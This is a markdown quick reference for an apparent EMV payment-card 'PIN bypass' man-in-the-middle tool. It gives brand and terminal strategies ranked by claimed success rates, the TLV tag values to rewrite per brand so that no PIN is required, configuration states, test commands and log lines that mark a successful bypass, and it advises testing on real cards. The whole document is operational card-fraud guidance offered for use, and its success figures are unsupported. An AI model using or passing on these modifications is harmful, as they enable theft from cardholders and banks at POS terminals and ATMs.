# Enhanced Bypass Engine Quick Reference

## Card Brand Detection

| Brand | BIN Ranges | Success Rate | Notes |
|-------|------------|--------------|-------|
| Visa | 4xxx | 85-90% | Most reliable, signature preferred |
| Mastercard | 5xxx, 2221-2720 | 85-90% | Good signature/CDCVM support |
| American Express | 34xx, 37xx | 95% | Signature-based, very reliable |
| Discover | 6011, 622126-622925, 644-649, 65xx | 85% | Follows Visa patterns |
| JCB | 3528-3589 | 80% | Regional variations |
| UnionPay | 62xx | 70% | Requires careful handling |

## Card Type Identification

| Type | AUC Patterns | Features | Best Terminal |
|------|--------------|----------|---------------|
| Debit | 08, 18, 28, 48 | Online PIN, Offline PIN | POS |
| Credit | 00, 01, 02, 04, 40 | Signature, CDCVM | POS/ATM |
| Prepaid | 20, 21, 22, 24 | Online PIN, Signature | POS |
| Business | 80, 81, 82, 84 | Enhanced limits, Signature | POS |

## Bypass Strategies by Combination

### High Success (90%+)

- Amex Credit + POS + Signature
- Visa Credit + POS + Signature  
- Mastercard Credit + POS + Signature

### Medium Success (75-89%)

- Visa Debit + POS + CDCVM
- Mastercard Debit + POS + CDCVM
- Any Business Card + POS + No CVM

### Lower Success (60-74%)

- Any Debit + ATM + PIN Bypass
- UnionPay + Any Terminal
- Unknown Brand + Any Terminal

## Terminal Optimization

### POS Terminals

```python
# Best for signature verification
strategy = {
    'primary_method': 'signature',
    'terminal_capabilities': '6068C8',
    'cvm_results': '1F0300'
}
```bash

### ATM Terminals  

```python
# Adapted for cash withdrawal
strategy = {
    'primary_method': 'cdcvm',
    'terminal_capabilities': '6000C8', 
    'cvm_results': '1E0300'
}
```text

## TLV Modifications by Brand

### Visa

```text
9F6C: 0000 (No PIN required)
9F10: 0110A00003220000000000000000000000FF (CVR)
95: 8000000000 (TVR)
9F34: 1F0300 (Signature CVM)
```text

### Mastercard

```text
9F6C: 0000 (No PIN required) 
9F10: 0110A00000220000000000000000000000FF (CVR)
95: 8000000000 (TVR)
8E: 000000000000000042031E031F00 (CVM List)
```text

### American Express

```text
9F6C: 0000 (No PIN required)
9F10: 0110A00007220000000000000000000000FF (CVR) 
95: 8000000000 (TVR)
8E: 000000000000000041031E031F00 (CVM List)
```text

## Configuration States

### Standard Bypass

```python
state = {
    'bypass_pin': True,
    'cdcvm_enabled': True,
    'block_all': False
}
```text

### Business Card Enhanced

```python
state = {
    'bypass_pin': True,
    'cdcvm_enabled': True, 
    'enhanced_limits': True,
    'block_all': False
}
```text

### Testing Mode

```python
state = {
    'bypass_pin': False,
    'cdcvm_enabled': False,
    'block_all': True  # Blocks all transactions
}
```bash

## Troubleshooting

### Card Not Detected

1. Check PAN in tag 5A
2. Verify AID in tag 4F  
3. Look for AUC in tag 9F07
4. Fall back to generic bypass

### Low Success Rate

1. Verify terminal compatibility
2. Check card type requirements
3. Adjust bypass strategy
4. Enable enhanced logging

### Bypass Failures  

1. UnionPay + ATM = High risk
2. Unknown brand = Use generic
3. Missing TLVs = Partial detection
4. Business cards need enhanced_limits

## Quick Test Commands

```bash
# Test all card types
python test_enhanced_bypass.py

# Test specific brand
python -c "from test_enhanced_bypass import test_visa_debit; test_visa_debit()"

# Check strategy for card
python -c "
from src.mitm.bypass_engine import get_bypass_strategy
strategy = get_bypass_strategy({'brand': 'Visa', 'type': 'Credit Card'}, 'POS')
print(strategy)
"
```text

## Success Indicators

### Logs to Watch

```python
✓ "Card brand detected from PAN: Visa"
✓ "Card type detected from AUC: Credit Card" 
✓ "Bypass strategy: signature (90% success)"
✓ "PIN bypass modifications applied successfully"
```text

### Failed Bypass Signs

```text
⚠ "Unknown card brand - using generic bypass"
⚠ "UnionPay + ATM combination has lower success rate"
⚠ "Business card detected but enhanced limits not enabled"
✗ "Blocking all communication due to block_all setting"
```text

## Performance Tips

1. **Enable comprehensive logging** for debugging
2. **Use card-specific strategies** rather than generic
3. **Validate compatibility** before applying bypass
4. **Monitor success rates** and adjust strategies
5. **Test with real card samples** when possible
